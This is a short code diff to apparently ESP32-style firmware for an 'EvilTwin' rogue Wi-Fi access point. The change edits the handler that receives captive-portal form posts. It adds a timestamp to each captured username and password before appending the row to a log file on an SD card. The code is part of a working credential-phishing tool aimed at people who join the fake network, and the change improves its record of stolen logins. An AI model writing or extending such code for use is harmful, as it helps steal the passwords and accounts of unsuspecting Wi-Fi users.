@@ -11,6 +11,7 @@
 
 #include "eviltwin.h"
 #include "input_handling.h"
+#include "clock_manager.h"
 #include <WiFi.h>
 #include <SD.h>
 
@@ -536,7 +537,11 @@ void EvilTwin::handlePost() {
         }
         if (sd.isReady()) {
             sd.ensureDir("/logs");
-            sd.appendLine(ET_LOG_PATH, user + "," + pass);
+            char ts[22] = "";
+            ClockManager::instance().getTimestamp(ts, sizeof(ts));
+            String logRow = ts[0] ? (String(ts) + "," + user + "," + pass)
+                                  : (user + "," + pass);
+            sd.appendLine(ET_LOG_PATH, logRow);
         }
         _captureCount++;
         _dirty = true;
